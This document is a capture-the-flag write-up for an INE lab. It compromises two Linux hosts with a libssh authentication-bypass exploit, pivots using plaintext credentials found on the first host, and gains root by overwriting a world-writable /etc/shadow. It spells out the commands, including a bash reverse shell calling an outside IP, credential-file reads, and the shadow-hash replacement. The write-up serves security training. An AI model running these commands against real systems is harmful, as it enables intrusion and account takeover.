# Host & Network Penetration Testing: Post-Exploitation CTF 1

**Completed:** November 7th, 2025  
**Platform:** INE  
> âš ï¸ This write-up is for educational purposes only. All activity was conducted within legal lab environments.

This CTF focused on simulating a post-exploitation scenario across two Linux systems. The goal was to identify misconfigurations, pivot between systems, and escalate privileges to root to capture all flags.

---

## ðŸŽ¯ Target: target1.ine.local

### ðŸ” Nmap Scan

```bash
nmap -sS -sV -sC -T4 target1.ine.local
```

**Explanation:** Performs a TCP SYN scan (`-sS`), service version detection (`-sV`), and runs default NSE scripts (`-sC`). The `-T4` flag speeds up scanning.

**Result:**
```
22/tcp open  ssh  libssh 0.8.3
```

---

### ðŸ”Ž Exploit Discovery

```bash
searchsploit libssh
```

**Explanation:** Searches the Exploit Database for known vulnerabilities related to *libssh*.

**Result:**  
Found `LibSSH 0.7.6 / 0.8.4 - Unauthorized Access` exploit at path `linux/remote/46307.py`.

Downloaded the exploit:

```bash
searchsploit -m 46307.py
```

**Explanation:** The `-m` flag copies the exploit script to the current directory for modification.

---

### ðŸ“– Why the Exploit Worked

Vulnerable versions of **libssh (0.7.6â€“0.8.4)** allow attackers to **bypass authentication** by sending a crafted `SSH2_MSG_USERAUTH_SUCCESS` message before actual authentication occurs.  
This tricks the server into thinking the attacker has already logged in successfully.

---

### ðŸš Reverse Shell Setup

Exploit format required:
```python
(hostname, port, command)
```

Set up a listener to catch the shell:

```bash
nc -lvnp 4444
```

**Explanation:** Opens a Netcat listener on port 4444 to receive the reverse shell.

Executed the exploit:

```bash
python3 46307.py target1.ine.local 22 "bash -i >& /dev/tcp/192.95.14.2/4444 0>&1"
```

**Explanation:** The exploit runs a reverse shell command connecting back to your listener.

âœ… **Result:** Gained shell access on the target.

Retrieved the first flag:

```bash
cat /etc/passwd
```

**Explanation:** Checked `/etc/passwd` to explore system users and found the first flag embedded there.

---

## ðŸ–¥ï¸ Post-Exploitation Enumeration on target1.ine.local

Gathered basic system info:

```bash
uname -a
```

**Explanation:** Displays kernel and OS information â€” useful for identifying the system type and kernel version for potential privilege escalation.

Checked group memberships:

```bash
cat /etc/group
```

**Explanation:** Reveals all groups and their users â€” helps identify potential privilege-related groups.

- Found **second flag** In file

Checked for scheduled tasks (cron jobs):

```bash
ls -la /etc/cron*
```

**Explanation:** Lists cron directories and files to identify automated tasks that could be abused for privilege escalation.

- No exploitable jobs found  
- Found **third flag** in cron*

Checked local hosts configuration:

```bash
cat /etc/hosts
```

**Explanation:** Displays local hostname mappings â€” sometimes used to hide information or contain flags.

- Found **fourth flag** in hosts file 

Discovered credential file:

```bash
cat /home/user/credentials.txt
```

**Explanation:** Inspected user home directories for potential secrets.

Found credentials:
```
john:Pass@john123
```

---

## ðŸŒ Pivot to target2.ine.local

Attempted SSH using discovered credentials:

```bash
ssh john@target2.ine.local
```

**Explanation:** Tested the found credentials on the second provided host.

âœ… **Result:** Logged in successfully with `john:Pass@john123`

However logged on as unprivileged user so priv esc was required.
---

### ðŸ”“ Privilege Escalation on target2

Checked for cron jobs:

```bash
ls -la /etc/cron*
```

**Explanation:** Looked for scheduled scripts running with elevated privileges.

No viable entries found.

Searched for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

**Explanation:** Searches for binaries with the SUID bit set â€” these can sometimes be exploited for privilege escalation.

â†’ No useful binaries found.

---

### ðŸš¨ Misconfiguration Discovered

Upon enumerating the file system as the low-privileged user `john`, a critical misconfiguration was identified in the permissions of the system's sensitive `/etc/shadow` file.

Observed permissions:

```bash
-rw-rw-rw- 1 root shadow 959 Nov 14 2024 /etc/shadow
```

**Explanation:** The `-rw-rw-rw-` permission means the file is **world-writable**, giving **read and write** access to everyone on the system â€” a serious vulnerability.

- **Owner:** root  
- **Group:** shadow  
- **Others:** everyone (including `john`)

This allowed `john` to modify `/etc/shadow` and effectively control user password hashes.

---

### ðŸ§© Exploiting the Misconfiguration

Generated a new root password hash:

```bash
openssl passwd -6 password
```

**Explanation:** Creates a SHA-512 hashed password (`password` in this case) to replace rootâ€™s existing hash.

Replaced the root hash in `/etc/shadow`.

Then logged in as root:

```bash
ssh root@target2.ine.local
```

âœ… **Result:** Gained root access.  
ðŸ“¥ Retrieved **final flag** from rootâ€™s account.

---

## ðŸ§  Summary

| Phase | Key Finding |
|-------|--------------|
| Initial Access | libssh authentication bypass exploit |
| Post-Exploitation | Found credentials and multiple flags |
| Pivot | SSH access to target2 using recovered creds |
| Privilege Escalation | `/etc/shadow` world-writable misconfiguration |
| Outcome | Root access achieved and all flags captured |

---

## ðŸ’¡ Lessons Learned

- Always check file permissions â€” misconfigs like world-writable `/etc/shadow` can lead directly to root.
- Credentials found on one host often work on others â€” always test them across the environment.
- Enumeration after initial access is just as important as exploitation â€” it often reveals the real vulnerabilities.
